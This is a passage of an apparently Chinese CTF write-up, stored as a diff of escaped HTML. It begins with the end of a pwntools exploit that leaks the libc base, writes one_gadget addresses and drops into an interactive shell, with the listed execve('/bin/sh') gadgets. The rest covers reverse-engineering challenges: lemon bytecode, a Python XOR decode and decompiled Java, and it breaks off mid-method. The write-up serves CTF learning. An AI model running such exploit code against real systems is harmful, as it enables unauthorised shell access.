+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(ru(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06f6a0&lt;/span&gt;
+log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;warning(hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
+ru(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;)
+sn(p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5f0040&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3848&lt;/span&gt;))
+ru(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;you!&amp;#39;&lt;/span&gt;)
+sn(p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xf1247&lt;/span&gt;))
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x45226 execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x30, environ)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  rax == NULL
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x4527a execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x30, environ)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  [rsp+0x30] == NULL
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0xf03a4 execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x50, environ)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  [rsp+0x50] == NULL
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0xf1247 execve(&amp;#34;/bin/sh&amp;#34;, rsp+0x70, environ)
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;constraints:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  [rsp+0x70] == NULL
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
+&lt;h3 id=&#34;lemon&#34;&gt;lemon&lt;/h3&gt;
+&lt;p&gt;感谢 yaoxi 师傅送的一血（狗头）&lt;/p&gt;
+&lt;p&gt;lemon 语言，仿照 HITCON cclemon，手动恢复字节码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-lemon&#34; data-lang=&#34;lemon&#34;&gt;var a = [65, 69, 83];
+var b = [113, 105, 117, 113, 105, 117, 108, 101, 98, 105, 101, 122, 117, 111, 108, 101];
+var c = 0;
+var d = [];
+while (c &amp;lt; 256){
+  d.append(c);
+  c = c + 1;
+};
+var e = 0;
+while (e &amp;lt; 256) {
+  d[e] = (d[e] + a[e % 3] + b[e % 16]) % 256;
+  e += 1;
+};
+var f = 0;
+while (f &amp;lt; 3) {
+  var g = 0;
+  while (g &amp;lt; 256) {
+    d[g] = d[g] ^ d[(g + 1) % 256];
+    g = g + 1;
+  };
+  var h = 0;
+  while (h &amp;lt; 256) {
+    d[h] = (d[h] + 1) % 256;
+    h = h + 1;
+  };
+  f = f + 1;
+};
+f = 0;
+var i = 0;
+while (f &amp;lt; 256) {
+  i = i + d[f];
+  f = f + 1;
+};
+i = i * 20 + 5;
+i = i * 30 - 5;
+i = i * 40 - 5;
+i = i * 50 + 6645;
+print(i);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行结果就是flag&lt;/p&gt;
+&lt;h3 id=&#34;easy_py&#34;&gt;easy_py&lt;/h3&gt;
+&lt;p&gt;uncompyle6反编译&lt;/p&gt;
+&lt;p&gt;sleep+多线程，两个运算轮流进行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]: cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;102&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;]
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]: &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;):
+   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     cipher[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; cipher[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     cipher[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]: cipher
+Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]: [&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;]
+
+In [&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]: &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
+   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:     print (chr(c), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
+   &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;:
+He110_cazy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;combat_slogan&#34;&gt;combat_slogan&lt;/h3&gt;
+&lt;p&gt;jd-gui可出源码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; com.xaut&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.PrintStream&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Scanner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Main&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;stringTransformAscii&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String value&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    StringBuffer sbu &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuffer&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toCharArray&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; chars&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;++)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; chars&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        sbu&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;chars&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        sbu&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;chars&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; sbu&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+  
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;ttk&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String input&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    StringBuilder sb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuilder&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; input&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;++)&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;m&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;N&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Z&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;c &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+      &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+      sb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; sb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+  
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please input your keyword::&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    Scanner scan &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Scanner&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    String str2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ddd&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;scan&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;hasNextLine&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      str2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scan&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;nextLine&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+    scan&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    
+    String stringTransformAscii &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; stringTransformAscii&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;str2&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    
+    String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; offerCodeString &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; stringTransformAscii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;split&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    StringBuffer str5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuffer&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String s &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; offerCodeString&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+      str5&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
